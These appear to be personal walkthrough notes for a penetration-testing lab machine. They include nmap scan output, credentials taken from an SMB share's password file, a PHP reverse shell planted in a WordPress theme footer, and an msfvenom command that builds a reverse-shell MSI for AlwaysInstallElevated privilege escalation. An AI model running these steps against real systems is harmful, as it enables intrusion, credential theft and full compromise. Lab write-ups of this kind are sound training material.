21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp    open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-favicon: Unknown favicon MD5: 56F7C04657931F2D0B79371B2D6E9820
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.146.55/dashboard/
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Welcome to XAMPP
|_Requested resource was https://192.168.146.55/dashboard/
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC

SMB shenzi has password.txt
<img width="764" height="422" alt="image" src="https://github.com/user-attachments/assets/43734fe5-7908-457a-b7fa-6f57676424d1" />
mysql  root:
mercury  newuuser:wampp
webdav  xampp-dav-unsecure:ppmax2011
wordpress  admin:FeltHeadwallWight357
<img width="756" height="639" alt="image" src="https://github.com/user-attachments/assets/865e3058-1648-48be-a3d9-a9781a11876f" />


port 80. xampp page. has phpinfo. docroot is C:/xampp/htdocs 
fuzzing was bad. endup the wordpress site was js /shenzi
<img width="1287" height="554" alt="image" src="https://github.com/user-attachments/assets/39c878db-c682-4603-91bd-72e67873fbac" />

go into theme editor and add ivan php rev shell into footer.php
<img width="1740" height="637" alt="image" src="https://github.com/user-attachments/assets/dda304d7-8950-400e-ad9c-af9784299241" />
<img width="1023" height="234" alt="image" src="https://github.com/user-attachments/assets/a5d69307-08c0-43f6-9181-2f9644ab6ea8" />

4) WEBDAV: 

   User: xampp-dav-unsecure
   Password: ppmax2011
   Attention: WEBDAV is not active since XAMPP Version 1.7.4.
   For activation please comment out the httpd-dav.conf and
   following modules in the httpd.conf
   
   LoadModule dav_module modules/mod_dav.so
   LoadModule dav_fs_module modules/mod_dav_fs.so  
winpeas alwaysinstallelevated
<img width="1031" height="86" alt="image" src="https://github.com/user-attachments/assets/f3d943df-f2d5-4cb2-842f-3a38f57211d7" />
indeed its set
<img width="773" height="198" alt="image" src="https://github.com/user-attachments/assets/2a5cafab-4638-4f4e-9424-05ebe6da35fc" />
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.184 LPORT=4444 -f msi --platform windows -a x64 -o hehe.msi

curl into victim
msiexec /i hehe.msi
<img width="327" height="78" alt="image" src="https://github.com/user-attachments/assets/62c327e8-e2ee-43e5-a3b4-39f837f74a7e" />


if it hangs, need to task kill
taskkill /f /im msiexec.exe

